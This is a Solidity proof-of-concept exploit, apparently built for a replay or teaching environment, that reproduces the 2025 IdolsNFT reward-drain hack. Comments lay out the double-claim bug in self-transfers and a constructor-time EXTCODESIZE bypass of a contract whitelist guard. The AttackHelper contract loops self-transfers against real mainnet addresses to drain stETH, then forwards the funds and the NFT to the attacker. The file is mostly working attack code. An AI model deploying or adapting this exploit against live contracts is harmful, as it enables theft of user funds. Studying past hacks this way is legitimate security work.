// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// Synthetic standalone exploit for the EVM Playground (2025-01-IdolsNFT).
//
// The real DeFiHackLabs PoC's `AttackContract` runs its entire attack loop
// inside its own CONSTRUCTOR. That is not incidental: IdolMain._beforeTokenTransfer
// is gated by `onlyAllowedContracts(_to)`, which rejects transfers to any
// non-whitelisted address whose `EXTCODESIZE > 0` (OpenZeppelin's
// `Address.isContract`). A contract executing inside its OWN constructor has
// EXTCODESIZE == 0 (code is only stored once the constructor returns), so the
// receiving contract sails through the whitelist guard as if it were an EOA —
// for as long as it stays inside that constructor. This is genuinely
// load-bearing: a normal, already-deployed contract calling a separate
// `attack()` function CANNOT receive or self-transfer the NFT here at all,
// since by then it has code and the guard reverts with "Function can only be
// called for whitelisted contracts".
//
// The recorder's own top-level exploit deploy is UNRECORDED, so a literal
// port (looping inside the top-level constructor) would produce an empty
// trace. Instead — mirroring the same pattern used by 2026-06-NovaBox.mjs for
// an analogous extcodesize-guard bypass — `attack()` (the RECORDED entrypoint)
// deploys a fresh `AttackHelper` via `new`. That CREATE happens as a sub-call
// INSIDE the recorded attack() frame, so the helper's constructor execution
// (the entire self-transfer loop) IS captured in the trace, while still
// genuinely running with EXTCODESIZE(helper) == 0 throughout — an exact,
// steppable reproduction of the real bypass mechanism, not just its outcome.
//
// Root cause: IdolMain._beforeTokenTransfer calls _claimEthRewards(_from) and
// then _claimEthRewards(_to) on every transfer to keep both parties' reward
// snapshots current. When _from == _to (a self-transfer of the same NFT,
// balanceOf never drops to 0), BOTH calls see the token still held and BOTH
// pay out the same pending reward — so one self-transfer claims the reward
// twice. Looping the self-transfer drains the contract's allocatedStethRewards
// pool of stETH far faster than real reward accrual could ever justify.

interface IIDOLS {
    function safeTransferFrom(address from, address to, uint256 tokenId) external;
    function allocatedStethRewards() external view returns (uint256);
    function rewardPerGod() external view returns (uint256);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

address constant IDOLS_NFT = 0x439cac149B935AE1D726569800972E1669d17094;
address constant ST_ETH = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;
uint256 constant TOKEN_ID = 940;

contract IdolsNFTDrain {
    address public immutable owner_;

    constructor(address _owner) {
        owner_ = _owner;
    }

    // The RECORDED entrypoint. TOKEN_ID must ALREADY sit at this contract's
    // OWN precomputed first-CREATE address (see config `setup`, which sends
    // it there directly from the attacker EOA — see the note below on why it
    // cannot pass through IdolsNFTDrain itself first).
    //
    // IdolsNFTDrain is a normal, already-deployed contract (it has code, so
    // it can never legally RECEIVE this NFT — Address.isContract() would see
    // its EXTCODESIZE > 0 and the whitelist guard would revert). So the NFT
    // is routed directly from the attacker to AttackHelper's own precomputed
    // CREATE address (this is IdolsNFTDrain's FIRST contract creation, so the
    // helper's nonce is 1 — same address-prediction trick the real Foundry
    // PoC uses via vm.computeCreateAddress, just one hop further down).
    // attack() then deploys the helper; its constructor performs the whole
    // double-claim loop while its OWN EXTCODESIZE is still 0, then forwards
    // the drained stETH + the NFT directly to owner_ (an EOA — sidesteps the
    // whitelist guard entirely for the final hop, exactly like the real
    // AttackContract does).
    function attack() external {
        new AttackHelper(owner_);
    }

    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return this.onERC721Received.selector;
    }
}

contract AttackHelper {
    // Put code in the constructor so Address.isContract() (EXTCODESIZE-based)
    // reports false for the ENTIRE body below — the exact bypass the real
    // AttackContract used. TOKEN_ID is already sitting here (attack() sent it
    // to this contract's precomputed address just before deploying it).
    constructor(address _finalReceiver) {
        for (uint256 i = 0; i < 2000; i++) {
            uint256 totalRewards = IIDOLS(IDOLS_NFT).allocatedStethRewards();
            uint256 rewardPerGod = IIDOLS(IDOLS_NFT).rewardPerGod();
            if (rewardPerGod > totalRewards) {
                break;
            }
            // Transferring an NFT gives rewards to both sender and receiver.
            // Using safeTransferFrom with same sender/receiver exploits this to
            // earn rewards without actually losing the NFT token.
            IIDOLS(IDOLS_NFT).safeTransferFrom(address(this), address(this), TOKEN_ID);
        }

        // Relay all stETH and the NFT token directly to the attacker EOA —
        // an EOA has no EXTCODESIZE, so this hop is unaffected by the guard.
        uint256 stEthAmount = IERC20(ST_ETH).balanceOf(address(this));
        IERC20(ST_ETH).transfer(_finalReceiver, stEthAmount);
        IIDOLS(IDOLS_NFT).safeTransferFrom(address(this), _finalReceiver, TOKEN_ID);
    }

    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return this.onERC721Received.selector;
    }
}
